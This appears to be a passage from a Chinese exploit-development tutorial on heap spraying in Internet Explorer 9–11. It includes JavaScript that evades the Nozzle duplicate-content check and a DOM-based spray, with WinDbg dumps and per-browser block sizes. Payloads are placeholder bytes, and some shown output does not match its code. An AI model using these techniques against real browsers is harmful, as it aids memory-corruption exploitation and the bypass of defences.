### 成功实现了精准堆喷射

#### Vista下的IE9的堆喷射
在IE9中，由于采用了Nozzle防御机制来检测和阻止包含重复内容的内存申请，导致传统的IE8脚本无法在IE9中成功执行。为了绕过这一检测，我们可以利用JavaScript生成随机字符串，并将其插入到堆喷射的数据中，从而避免被检测为重复内容。

**示例代码：**
```javascript
var heap_obj = new heapLib.ie(0x10000);
var code = unescape("%u6174%u7367"); // tags
for (var i = 0; i < 0x10000; i++) {
    heap_obj.alloc(code + Math.random().toString(36).substring(2, 15));
}
```

**验证结果：**
```plaintext
0:017> dd 0c0c0c0c
0c0c0c0c  53885684 53885684 53885684 53885684
0c0c0c1c  53885684 53885684 53885684 53885684
```
由于IE9中的堆喷射方法无法直接查看堆的情况，我们可以通过在内存中搜索特定的标签（例如"tags"）来验证堆喷射是否成功。
```plaintext
0:017> s -a 0x00000000 L?7fffffff "tags"
00419b75  74 61 67 73 0a 2f 2f 76-61 72 20 72 6f 70 20 3d  tags.//var rop =
...
0396a00c  74 61 67 73 92 39 90 17-92 39 90 17 92 39 90 17  tags.9...9...9..
```
通过上述搜索结果可以看出，堆喷射是成功的。

#### 精准堆喷射脚本
```javascript
var heap_obj = new heapLib.ie(0x10000);
var code = unescape("%ucccc%ucccc");
var rop = unescape("%u4141%u4141%u4242%u4242%u4343%u4343%u4444%u4444");
var offset_length = 0x5fe;
for (var i = 0; i < 0x10000; i++) {
    heap_obj.alloc(code + rop + String.fromCharCode(i % 256));
}
```

**结果：**
```plaintext
0:022> dd 0c0c0c0c
0c0c0c0c  41414141 42424242 43434343 44444444
0c0c0c1c  cccccccc 57376654 57376654 57376654
```

#### 不同浏览器下的堆喷射尺寸
| 操作系统 & 浏览器 | 块语法 |
|------------------|--------|
| XP SP3 – IE7     | `block = shellcode.substring(2, 0x10000 - 0x21);` |
| XP SP3 – IE8     | `block = shellcode.substring(2, 0x40000 - 0x21);` |
| Vista SP2 – IE7  | `block = shellcode.substring(0, (0x40000 - 6) / 2);` |
| Vista SP2 – IE8  | `block = shellcode.substring(0, (0x40000 - 6) / 2);` |
| Win7 – IE8       | `block = shellcode.substring(0, (0x80000 - 6) / 2);` |

#### Win8下的IE10和IE11的堆喷射
在IE10和IE11中，传统的BSTR字符串方法不再适用。取而代之的是使用DEPS技术，通过创建大量的DOM对象并在其属性中填入相应的字符串来进行堆喷射。

**示例代码：**
```javascript
var div_container = document.getElementById("blah");
div_container.style.cssText = "display:none";
var data;
var offset = 0x104;
var junk = unescape("%u2020%u2020");
while (junk.length < 0x10000) {
    var button = document.createElement("button");
    button.title = junk;
    div_container.appendChild(button);
    junk += unescape("%u2020%u2020");
}
```

**验证结果：**
```plaintext
0:016> dd 20302228
20302228  41414141 42424242 43434343 44444444
20302238  cccccccc 20202020 20202020 20202020
20302248  20202020 20202020 20202020 20202020
```

#### 总结
除了上述方法外，还有HTML5 Spray、ActionScript Spray、Array Object Heap Spraying、JIT Spray等方法进行堆喷射和绕过浏览器的安全机制。然而，在现代64位系统中，由于地址空间过大，堆喷射变得较为困难。尽管如此，在某些特定情况下，堆喷射仍然具有一定的实用价值。